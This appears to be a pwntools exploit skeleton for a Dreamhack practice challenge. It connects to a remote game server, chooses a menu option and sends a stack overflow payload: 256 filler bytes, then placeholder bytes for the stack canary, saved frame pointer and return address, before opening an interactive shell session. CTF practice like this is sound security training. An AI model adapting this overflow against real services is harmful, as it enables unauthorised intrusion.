from pwn import *

# nc host3.dreamhack.games 9022
p = remote('host3.dreamhack.games', 9022)

p.sendafter(">>", b"1")

pay = b""
pay += b"A" * 256
pay += b"B" * 8 # canary
pay += b"C" * 8 # sfp
pay += b"D" * 8 

p.sendline(pay)

p.interactive()